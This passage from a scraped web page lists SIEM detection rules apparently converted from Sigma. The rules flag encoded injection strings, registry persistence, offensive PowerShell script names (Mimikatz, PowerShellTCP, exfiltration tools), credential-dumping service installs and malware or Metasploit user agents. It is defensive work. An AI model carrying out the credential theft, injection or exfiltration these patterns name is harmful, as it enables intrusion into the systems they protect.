re.regex($encoded.target.process.command_line, `.*SFJFQURfSU5GTzY0.*`) or re.regex($encoded.target.process.command_line, `.*VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA.*`) or re.regex($encoded.target.process.command_line, `.*VEhSRUFEX0lORk82N.*`) or re.regex($encoded.target.process.command_line, `.*AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA.*`) or re.regex($encoded.target.process.command_line, `.*cmVhdGVSZW1vdGVUaHJlYW.*`) or re.regex($encoded.target.process.command_line, `.*MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA.*`) or re.regex($encoded.target.process.command_line, `.*NyZWF0ZVJlbW90ZVRocmVhZ.*`) or re.regex($encoded.target.process.command_line, `.*Q3JlYXRlUmVtb3RlVGhyZWFk.*`) or re.regex($encoded.target.process.command_line, `.*QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA.*`) or re.regex($encoded.target.process.command_line, `.*0AZQBtAG0AbwB2AGUA.*`) or re.regex($encoded.target.process.command_line, `.*1lbW1vdm.*`) or re.regex($encoded.target.process.command_line, `.*AGUAbQBtAG8AdgBlA.*`) or re.regex($encoded.target.process.command_line, `.*bQBlAG0AbQBvAHYAZQ.*`) or re.regex($encoded.target.process.command_line, `.*bWVtbW92Z.*`) or re.regex($encoded.target.process.command_line, `.*ZW1tb3Zl.*`)) and ($encoded.metadata.product_event_type = "4688" or $encoded.metadata.product_event_type = "1")) condition: $encoded 
<li><a href="#">rule malicious_behaviour_on_user_login_microsoft_windows__c0d0s0_group_behavior { meta: author = "Ariel Millahuel" description = "Detects malicious registry values and unusual AppData folder modification related also to c0d0s0 group. License: ." reference = "" version = "0.01" created = "2019/11/21" product = "windows" category = "registry_event" mitre = "persistence, privilege_escalation, t1112, t1547, t1547.001" events: ($selection1.metadata.event_type = "SetValue" and (re.regex($selection1.target.registry.registry_key, `.*\\CurrentVersion\\Run\\Windows Debug Tools.*`) or (re.regex($selection1.target.registry.registry_key, `.*\\CurrentVersion\\SvcHost\\netsvcs.*`) or re.regex($selection1.target.registry.registry_key, `.*\\Dncp\\Parameters\\ServiceDll.*`)))) condition: $selection1 
<li><a href="#">rule malicious_behaviour_on_user_login_microsoft_windows__c0d0s0_group_behavior_part_1 { meta: author = "Ariel Millahuel" description = "Detects malicious registry values and unusual AppData folder modification related also to c0d0s0 group. License: ." reference = "" version = "0.01" created = "2019/11/21" category = "file_event" product = "windows" mitre = "persistence, privilege_escalation, t1112, t1547, t1547.001" events: (re.regex($selection3.target.file.full_path, `.*AppData\\.*\\fakerx86\.exe.*`) or re.regex($selection3.target.file.full_path, `.*AppData\\.*\\dbgeng\.dll.*`)) condition: $selection3 
<li><a href="#">rule malicious_powershell_commandlet_names { meta: author = "Markus Neis" description = "Detects the creation of known powershell scripts for exploitation License: ." reference = "" version = "0.01" created = "2018/04/07" product = "windows" service = "sysmon" mitre = "execution, t1086" events: ($selection.metadata.product_event_type = "11" and (re.regex($selection.target.file.full_path, `.*\\Invoke-DllInjection\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-WmiCommand\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-GPPPassword\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-Keystrokes\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-VaultCredential\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-CredentialInjection\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-Mimikatz\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-NinjaCopy\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-TokenManipulation\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Out-Minidump\.ps1`) or re.regex($selection.target.file.full_path, `.*\\VolumeShadowCopyTools\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-ReflectivePEInjection\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-TimedScreenshot\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-UserHunter\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Find-GPOLocation\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-ACLScanner\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-DowngradeAccount\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-ServiceUnquoted\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-ServiceFilePermission\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-ServicePermission\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-ServiceAbuse\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Install-ServiceBinary\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-RegAutoLogon\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-VulnAutoRun\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-VulnSchTask\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-UnattendedInstallFile\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-WebConfig\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-ApplicationHost\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-RegAlwaysInstallElevated\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-Unconstrained\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Add-RegBackdoor\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Add-ScrnSaveBackdoor\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Gupt-Backdoor\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-ADSBackdoor\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Enabled-DuplicateToken\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-PsUaCme\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Remove-Update\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Check-VM\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-LSASecret\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-PassHashes\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Show-TargetScreen\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Port-Scan\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-PoshRatHttp\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-PowerShellTCP\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-PowerShellWMI\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Add-Exfiltration\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Add-Persistence\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Do-Exfiltration\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Start-CaptureServer\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-ShellCode\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-ChromeDump\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-ClipboardContents\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-FoxDump\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-IndexedItem\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-Screenshot\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-Inveigh\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-NetRipper\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-EgressCheck\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-PostExfil\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-PSInject\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-RunAs\.ps1`) or re.regex($selection.target.file.full_path, `.*\\MailRaider\.ps1`) or re.regex($selection.target.file.full_path, `.*\\New-HoneyHash\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Set-MacAttribute\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-DCSync\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-PowerDump\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Exploit-Jboss\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-ThunderStruck\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-VoiceTroll\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Set-Wallpaper\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-InveighRelay\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-PsExec\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-SSHCommand\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-SecurityPackages\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Install-SSP\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-BackdoorLNK\.ps1`) or re.regex($selection.target.file.full_path, `.*\\PowerBreach\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-SiteListPassword\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-System\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-BypassUAC\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-Tater\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-WScriptBypassUAC\.ps1`) or re.regex($selection.target.file.full_path, `.*\\PowerUp\.ps1`) or re.regex($selection.target.file.full_path, `.*\\PowerView\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Get-RickAstley\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Find-Fruit\.ps1`) or re.regex($selection.target.file.full_path, `.*\\HTTP-Login\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Find-TrustedDocuments\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-Paranoia\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-WinEnum\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-ARPScan\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-PortScan\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-ReverseDNSLookup\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-SMBScanner\.ps1`) or re.regex($selection.target.file.full_path, `.*\\Invoke-Mimikittenz\.ps1`))) condition: $selection 
<li><a href="#">rule malicious_service_installations { meta: author = "Florian Roth" description = "Detects known malicious service installs that only appear in cases of lateral movement, credential dumping and other suspicious activity License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "system" mitre = "persistence, privilege_escalation, t1050" events: ($selection.metadata.product_event_type = "7045" and (($selection.target.process.command_line = "WCESERVICE" or $selection.target.process.command_line = "WCE SERVICE") or re.regex($selection.target.process.command_line, `.*\\PAExec.*`) or re.regex($selection.target.process.command_line, `winexesvc\.exe.*`) or re.regex($selection.target.process.command_line, `.*\\DumpSvc\.exe`) or $selection.target.process.command_line = "mssecsvc2.0" or re.regex($selection.target.process.command_line, `.* net user .*`) or (re.regex($selection.target.process.command_line, `pwdump.*`) or re.regex($selection.target.process.command_line, `gsecdump.*`) or re.regex($selection.target.process.command_line, `cachedump.*`)))) condition: $selection 
<li><a href="#">rule malicious_utilization_of_mofcompexe_via_cmd { meta: author = "Ariel Millahuel" description = "Detects the invocation of mofcomp.exe via CMD in order to execute an malicious script License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, S0106" events: ($selection1.target.process.file.full_path = "cmd.exe" and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and ((re.regex($selection1.target.process.command_line, `.* cmd /c mofcomp\.exe C:\\Windows\\temp.*\.rar .*`) or re.regex($selection1.target.process.command_line, `.* cmd /c del C:\\Windows\\temp.*\.rar .*`) or re.regex($selection1.target.process.command_line, `.* cmd /c mofcomp\.exe C:\\Windows\\temp.*\..* .*`) or re.regex($selection1.target.process.command_line, `.* cmd /c del C:\\Windows\\temp.*\..* .*`)) or (re.regex($selection1.target.process.command_line, `.* cmd /c mofcomp\.exe C:\\Users.*\\AppData\\Local\\Temp.*\..* .*`) or re.regex($selection1.target.process.command_line, `.* cmd /c del C:\\Users.*\\AppData\\Local\\Temp.*\..* .*`)))) condition: $selection1 
<li><a href="#">rule malware_user_agent { meta: author = "Florian Roth" description = "Detects suspicious user agent strings used by malware in proxy logs License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" events: ($selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Chrome /53.0" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)" or $selection.src.application = "HttpBrowser/1.0" or re.regex($selection.src.application, `.*<|>.*`) or $selection.src.application = "nsis_inetc (mozilla)" or $selection.src.application = "Wget/1.9+cvs-stable (Red Hat modified)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)" or re.regex($selection.src.application, `.*zeroup.*`) or re.regex($selection.src.application, `Mozilla/5\.0 \(Windows NT 5\.1 ; v\..*`) or re.regex($selection.src.application, `.* adlib/.*`) or re.regex($selection.src.application, `.* tiny`) or re.regex($selection.src.application, `.* BGroom .*`) or re.regex($selection.src.application, `.* changhuatong`) or re.regex($selection.src.application, `.* CholTBAgent`) or $selection.src.application = "Mozilla/5.0 WinInet" or $selection.src.application = "RookIE/1.0" or $selection.src.application = "M" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" or $selection.src.application = "Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)" or $selection.src.application = "backdoorbot" or $selection.src.application = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731)" or $selection.src.application = "Opera/8.81 (Windows NT 6.0; U; en)" or $selection.src.application = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)" or $selection.src.application = "Opera" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" or $selection.src.application = "MSIE" or re.regex($selection.src.application, `.*\(Charon; Inferno\)`) or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)" or $selection.src.application = "Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.1)" or re.regex($selection.src.application, `.* pxyscand.*`) or re.regex($selection.src.application, `.* asd`) or re.regex($selection.src.application, `.* mdms`) or $selection.src.application = "sample" or $selection.src.application = "nocase" or $selection.src.application = "Moxilla" or re.regex($selection.src.application, `Win32 .*`) or re.regex($selection.src.application, `.*Microsoft Internet Explorer.*`) or re.regex($selection.src.application, `agent .*`) or $selection.src.application = "AutoIt" or $selection.src.application = "IczelionDownLoad") condition: $selection 
<li><a href="#">rule mavinject_process_injection { meta: author = "Florian Roth" description = "Detects process injection using the signed Windows tool Mavinject32.exe License: ." reference = "" version = "0.01" created = "2018/12/12" category = "process_creation" product = "windows" mitre = "process_injection, t1055, signed_binary_proxy_execution, t1218" events: (re.regex($selection.target.process.command_line, `.* /INJECTRUNNING .*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule metasploit_framework_user_agents_proxy { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Metasploit Framework User Agents Detection. License: ." reference = "" version = "0.01" created = "2019/02/27" product = "proxy" mitre = "Command and Control, t1071" events: ($selection.src.application = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" or $selection.src.application = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)" or $selection.src.application = "Mozilla/5.0" or $selection.src.application = "Mozilla/4.0 (compatible; Metasploit RSPEC)" or $selection.src.application = "Mozilla/5.0 (iPad; CPU OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E238 Safari/601.1" or $selection.src.application = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/525.13" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" or $selection.src.application = "Mozilla/Projects/NSPR" or $selection.src.application = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1" or $selection.src.application = "Mozilla/5.0 (compatible; Googlebot/2.1; +)" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" or $selection.src.application = "Mozilla/5.0 (iPod touch; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14B150 Safari/602.1" or $selection.src.application = "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4" or $selection.src.application = "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4" or $selection.src.application = "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4" or $selection.src.application = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" or $selection.src.application = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" or $selection.src.application = "Mozilla/5.0 (compatible; Googlebot/2.1; +)" or $selection.src.application = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" or $selection.src.application = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0" or $selection.src.application = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.7.0" or $selection.src.application = "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0" or $selection.src.application = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.63 Safari/534.3" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; rv:39.0) Gecko/20100101 Firefox/35.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393" or $selection.src.application = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) 